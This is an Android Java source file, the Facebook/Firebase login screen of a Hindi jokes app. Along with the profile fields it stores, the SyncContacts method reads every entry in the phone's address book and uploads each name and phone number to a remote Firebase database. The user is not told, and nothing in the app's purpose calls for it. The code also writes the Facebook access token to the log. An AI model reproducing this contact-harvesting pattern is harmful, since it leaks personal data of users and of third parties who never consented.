package com.nineinfosys.android.hindijokes;

import android.*;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ListView;
import android.widget.Toast;

import com.facebook.AccessToken;
import com.facebook.CallbackManager;
import com.facebook.FacebookCallback;
import com.facebook.FacebookException;
import com.facebook.FacebookSdk;
import com.facebook.GraphRequest;
import com.facebook.GraphResponse;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.login.LoginResult;
import com.facebook.login.widget.LoginButton;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthCredential;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FacebookAuthProvider;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
import com.microsoft.windowsazure.mobileservices.table.sync.MobileServiceSyncTable;
import com.squareup.okhttp.OkHttpClient;

import org.json.JSONObject;

import java.net.MalformedURLException;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

public class Login extends AppCompatActivity {




    private MobileServiceClient mClient;

    private MobileServiceTable<Contacts> contactsMobileServiceTable;





    private LoginButton mLoginBtn;
    private CallbackManager mCallbackManager;
    private static final String TAG = "FacebookLogin";
    private User user;
    private FirebaseAuth mAuth;

    private DatabaseReference mDataBase;
    private DatabaseReference mDataBaseContacts;
    private static final int REQUEST_CONTACTS = 1;

    private static String[] PERMISSIONS_CONTACT = {android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.WRITE_CONTACTS};
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        FacebookSdk.sdkInitialize(getApplicationContext());
        AppEventsLogger.activateApp(this);
        setContentView(R.layout.activity_login);

        mCallbackManager = CallbackManager.Factory.create();
        mAuth=FirebaseAuth.getInstance();
        mDataBase = FirebaseDatabase.getInstance().getReference().child("HindiJokesApp").child("Users");
        mDataBaseContacts = FirebaseDatabase.getInstance().getReference().child("HindiJokesApp").child("Contacts");

        mLoginBtn = (LoginButton)findViewById(R.id.login_button);

        mLoginBtn.setReadPermissions(Arrays.asList("email", "public_profile", "user_friends", "user_birthday", "user_location"));

        CheckPermission();
        mLoginBtn.registerCallback(mCallbackManager, new FacebookCallback<LoginResult>() {
            @Override
            public void onSuccess(LoginResult loginResult) {




                GraphRequest request = GraphRequest.newMeRequest(
                        loginResult.getAccessToken(),
                        new GraphRequest.GraphJSONObjectCallback() {
                            @Override
                            public void onCompleted(
                                    JSONObject object,
                                    GraphResponse response) {

                                Log.e("response: ", response + "");
                                try {
                                    user = new User();
                                    user.facebookID = object.getString("id").toString();
                                    user.email = object.getString("email").toString();
                                    user.name = object.getString("name").toString();
                                    user.gender = object.getString("gender").toString();


                                    //PrefUtils.setCurrentUser(user,Login.this);

                                }catch (Exception e){
                                    e.printStackTrace();
                                }
                                Toast.makeText(Login.this,"Welcome "+user.name,Toast.LENGTH_LONG).show();



                            }

                        });

                Bundle parameters = new Bundle();
                parameters.putString("fields", "id,name,email,gender, birthday");
                request.setParameters(parameters);
                request.executeAsync();
                handleFacebookAccessToken(loginResult.getAccessToken());







            }

            @Override
            public void onCancel() {
                Log.d(TAG, "facebook:onCancel");
            }

            @Override
            public void onError(FacebookException error) {
                Log.d(TAG, "facebook:onError", error);
            }
        });
    }

    private void handleFacebookAccessToken(AccessToken token){
        Log.d(TAG, "handleFacebookAccessToken:" + token);

        AuthCredential credential= FacebookAuthProvider.getCredential(token.getToken());

        mAuth.signInWithCredential(credential).addOnCompleteListener(this, new OnCompleteListener<AuthResult>() {
            @Override
            public void onComplete(@NonNull Task<AuthResult> task) {




                if (!task.isSuccessful()) {

                    Log.w(TAG, "signInWithCredential", task.getException());

                    Toast.makeText(Login.this, "Authentication failed.", Toast.LENGTH_SHORT).show();
                }

                else {
                    CreateNewUserInDatabase();
                    Intent loginIntent = new Intent(Login.this, MainActivity.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);
                    finish();



                }
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        // Pass the activity result back to the Facebook SDK
        mCallbackManager.onActivityResult(requestCode, resultCode, data);
    }


    private void CreateNewUserInDatabase(){

        String user_id = mAuth.getCurrentUser().getUid();
        DatabaseReference current_user_db = mDataBase.child(user_id);
        current_user_db.child("Name").setValue(user.name);
        current_user_db.child("FacebookId").setValue(user.facebookID);
        current_user_db.child("Email").setValue(user.email);
        current_user_db.child("Gender").setValue(user.gender);

        SyncContacts();




    }


    private void CheckPermission(){
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED)
        {

            Log.i(TAG, "Contact permissions has NOT been granted. Requesting permissions.");
            requestContactsPermissions();

        } else {

            // Contact permissions have been granted. Show the contacts fragment.
            Log.i(TAG,
                    "Contact permissions have already been granted. Displaying contact details.");

        }
    }

    protected void SyncContacts(){

        String user_id = mAuth.getCurrentUser().getUid();
        DatabaseReference current_user_db = mDataBaseContacts.child(user_id);


        Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);

        while(phone.moveToNext()){
            String name;
            String number;

            name=phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            number=phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            try {
                current_user_db.child(number).setValue(name);

            }
            catch(Exception e) {

            }





        }
    }


    private void requestContactsPermissions() {
        // BEGIN_INCLUDE(contacts_permission_request)
        if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_CONTACTS))
        {
            ActivityCompat.requestPermissions(Login.this, PERMISSIONS_CONTACT, REQUEST_CONTACTS);
            Log.i(TAG, "permission was asked");

        } else {
            // Contact permissions have not been granted yet. Request them directly.
            ActivityCompat.requestPermissions(this, PERMISSIONS_CONTACT, REQUEST_CONTACTS);
        }
        // END_INCLUDE(contacts_permission_request)
    }


    @Override
    public void onBackPressed() {
        moveTaskToBack(true);
        android.os.Process.killProcess(android.os.Process.myPid());
        System.exit(1);
    }
    public class User {


        public String name;

        public String email;

        public String facebookID;

        public String gender;


    }
}
